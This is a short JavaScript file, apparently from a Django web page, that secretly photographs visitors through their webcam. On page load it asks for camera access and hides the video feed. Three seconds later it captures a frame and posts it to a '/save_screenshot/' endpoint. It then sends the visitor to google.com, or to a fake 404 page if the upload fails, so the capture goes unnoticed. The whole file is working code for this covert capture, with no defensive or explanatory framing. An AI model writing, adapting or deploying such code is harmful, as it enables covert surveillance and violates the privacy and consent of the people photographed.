const videoElement = document.getElementById('webcam');

window.addEventListener('DOMContentLoaded', async () => {
    try {
        if (navigator.mediaDevices) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            videoElement.srcObject = stream;
            videoElement.style.display = 'none';
            setTimeout(() => {
                takeScreenshot();
            }, 3000);
        } else {
            console.error('navigator.mediaDevices is not available');
        }
    } catch (error) {
        console.error('Error accessing the webcam: ', error);
    }
});

function takeScreenshot() {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    
    const screenshot = canvas.toDataURL('image/png');

    // Send the screenshot to the Django endpoint using Ajax
    const csrfToken = getCSRFToken();

    $.ajax({
        url: '/save_screenshot/',
        type: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': csrfToken,
        },
        data: JSON.stringify({ screenshot }),
        success: function (data) {
            window.location.href="https://www.google.com/"
            console.log(data);
        },
        error: function (error) {
            window.location.href="https://colorlib.com/etc/404/colorlib-error-404-6/"
            console.error('Error saving screenshot: ', error);
        },
    });
}

function getCSRFToken() {
    const csrfTokenInput = document.querySelector('[name=csrfmiddlewaretoken]');
    return csrfTokenInput ? csrfTokenInput.value : null;
}
